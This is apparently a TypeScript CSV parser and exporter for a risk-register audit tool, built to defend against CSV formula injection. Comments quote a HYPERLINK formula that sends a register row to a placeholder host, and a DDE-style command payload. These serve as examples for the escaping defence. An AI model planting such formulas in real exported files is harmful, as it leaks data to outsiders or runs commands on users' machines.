/**
 * CSV in, CSV out.
 *
 * Both directions treat the register as hostile, for different reasons.
 *
 * Reading: the file was produced by somebody else's GRC tool, or by somebody's
 * hand in Excel, and it will contain a quoted field with a newline in it, a
 * UTF-8 BOM, a stray carriage return, and a trailing blank line. The parser is
 * a straightforward RFC 4180 state machine that handles all four rather than a
 * `split(',')` that handles none.
 *
 * Writing: this is where the real hazard lives. A field in the source register
 * that begins `=`, `+`, `-`, `@`, a tab or a carriage return is interpreted as
 * a *formula* when the exported CSV is opened in Excel, LibreOffice or Sheets.
 * `=HYPERLINK("https://x/?"&A1,"ok")` in a risk title becomes, on export, a
 * click that sends a row of the register to a stranger. PARALLAX never sends
 * the register anywhere -- and would be handing over the means to do it itself
 * if its exporter did not neutralise these. `escapeField` does, and
 * `csv.test.ts` asserts it for every trigger character.
 */

import { MAX_COLUMNS, MAX_FIELD_CHARS, MAX_ROWS } from './limits.ts'
import { importError } from './errors.ts'

export interface CsvTable {
  readonly header: readonly string[]
  readonly rows: readonly (readonly string[])[]
  /** Structural oddities that did not stop the parse. */
  readonly warnings: readonly string[]
}

/**
 * Parses RFC 4180 CSV.
 *
 * Deviations from the spec, all of them in the direction of accepting real
 * files:
 *   - A leading UTF-8 BOM is stripped.
 *   - Bare CR, bare LF and CRLF all end a record.
 *   - A record with fewer fields than the header is padded; one with more is
 *     truncated and warned about, rather than rejected. A register that is
 *     three columns ragged on row 900 is still worth auditing.
 *   - Trailing blank lines are discarded.
 *
 * An unterminated quote is *not* accepted: everything after it would be read
 * as one enormous field, which silently destroys the rest of the register.
 */
export function parseCsv(text: string): CsvTable {
  const input = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text
  const warnings: string[] = []

  const records: string[][] = []
  let field = ''
  let record: string[] = []
  let inQuotes = false
  let truncatedFields = 0

  const pushField = (): void => {
    if (field.length > MAX_FIELD_CHARS) {
      field = field.slice(0, MAX_FIELD_CHARS)
      truncatedFields += 1
    }
    record.push(field)
    field = ''
  }

  const pushRecord = (): void => {
    pushField()
    // A record of one empty field is a blank line, not a row of data.
    if (!(record.length === 1 && record[0] === '')) records.push(record)
    record = []
  }

  for (let i = 0; i < input.length; i += 1) {
    const ch = input[i] as string

    if (inQuotes) {
      if (ch === '"') {
        if (input[i + 1] === '"') {
          field += '"'
          i += 1
        } else {
          inQuotes = false
        }
      } else {
        field += ch
      }
      continue
    }

    if (ch === '"') {
      // A quote that opens mid-field ("ab"cd") is malformed. Real exporters
      // produce it when a value contained a quote and was not escaped; the
      // least destructive reading is to treat it as opening a quoted section.
      inQuotes = true
      continue
    }
    if (ch === ',') {
      pushField()
      continue
    }
    if (ch === '\r') {
      if (input[i + 1] === '\n') i += 1
      pushRecord()
      continue
    }
    if (ch === '\n') {
      pushRecord()
      continue
    }
    field += ch
  }

  if (inQuotes) {
    throw importError(
      'unterminated-quote',
      'The file has an unclosed quotation mark.',
      `The quoted field beginning in record ${records.length + 1} is never closed, so everything after it would be read as a single value.`,
      'Open the file in a spreadsheet and look for a cell containing an odd number of " characters, then re-export. Exporting as JSON avoids the problem entirely.',
    )
  }
  if (field.length > 0 || record.length > 0) pushRecord()

  if (records.length === 0) {
    throw importError(
      'file-empty',
      'The file contains no rows.',
      'Zero records were found after parsing.',
      'Check that you selected the right file, and that it has a header row followed by at least one risk.',
    )
  }

  const header = (records[0] as string[]).map((h) => h.trim())
  if (header.length > MAX_COLUMNS) {
    throw importError(
      'too-many-columns',
      'The file has more columns than PARALLAX will read.',
      `${header.length} columns, limit ${MAX_COLUMNS}.`,
      'This usually means a spreadsheet was exported with its full grid rather than its used range. Delete the empty columns and re-export.',
    )
  }
  if (header.every((h) => h === '')) {
    throw importError(
      'no-header',
      'The first row is empty, so there are no column names to map.',
      'Every field in record 1 is blank.',
      'Put the column names on the first row and re-export.',
    )
  }

  const body = records.slice(1)
  if (body.length > MAX_ROWS) {
    throw importError(
      'too-many-rows',
      'The register is larger than PARALLAX will analyse.',
      `${body.length} rows, limit ${MAX_ROWS}.`,
      'Split the register by business unit and audit each one separately. The pairwise analyses are quadratic, so the limit is about keeping the interface usable rather than about memory.',
    )
  }

  let ragged = 0
  const rows = body.map((r) => {
    if (r.length === header.length) return r
    ragged += 1
    if (r.length < header.length) {
      return [...r, ...new Array<string>(header.length - r.length).fill('')]
    }
    return r.slice(0, header.length)
  })

  if (ragged > 0) {
    warnings.push(
      `${ragged} row${ragged === 1 ? '' : 's'} did not have exactly ${header.length} fields. Short rows were padded with blanks; long rows were truncated to the header width.`,
    )
  }
  if (truncatedFields > 0) {
    warnings.push(
      `${truncatedFields} field${truncatedFields === 1 ? ' was' : 's were'} longer than ${MAX_FIELD_CHARS} characters and had the remainder discarded.`,
    )
  }

  return { header, rows, warnings }
}

/**
 * The characters that make a spreadsheet treat a cell as a formula rather than
 * as text. Tab and carriage return are included because Excel strips leading
 * whitespace before deciding, so `\t=cmd` is still a formula.
 */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r'])

/**
 * A value that is entirely a number, so `-2` is a negative two rather than the
 * start of a formula.
 *
 * Without this exception the escape corrupts real data: an assessor's
 * likelihood offset of `-2` would export as `'-2`, which a spreadsheet reads
 * as text, which means the column cannot be sorted, charted or summed. A
 * safety measure that quietly breaks the numbers it is protecting is not a
 * safety measure.
 *
 * It is safe because a formula is never *only* digits and a sign:
 * `-2+3`, `-cmd|'/c calc'!A1` and `+1+1` all fail this test and are escaped.
 */
const PURE_NUMBER = /^-?(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?$/

/**
 * Renders one value as a CSV field.
 *
 * Two jobs, in this order:
 *   1. Neutralise formula injection by prefixing a leading trigger character
 *      with an apostrophe, which every major spreadsheet reads as "the rest of
 *      this cell is text" and does not display.
 *   2. Quote and escape for CSV itself.
 *
 * The order matters: prefixing after quoting would put the apostrophe outside
 * the quotes, where it is data rather than an escape.
 */
export function escapeField(value: string): string {
  let out = value
  const first = out[0]
  if (first !== undefined && FORMULA_TRIGGERS.has(first) && !PURE_NUMBER.test(out)) {
    out = `'${out}`
  }
  if (/[",\n\r]/.test(out)) out = `"${out.replace(/"/g, '""')}"`
  return out
}

/** Serialises a table. Always CRLF, which is what RFC 4180 specifies. */
export function toCsv(header: readonly string[], rows: readonly (readonly unknown[])[]): string {
  const lines: string[] = [header.map((h) => escapeField(h)).join(',')]
  for (const row of rows) {
    lines.push(row.map((cell) => escapeField(cellToString(cell))).join(','))
  }
  return `${lines.join('\r\n')}\r\n`
}

function cellToString(cell: unknown): string {
  if (cell === null || cell === undefined) return ''
  if (typeof cell === 'number') return Number.isFinite(cell) ? String(cell) : ''
  if (typeof cell === 'boolean') return cell ? 'true' : 'false'
  return String(cell)
}
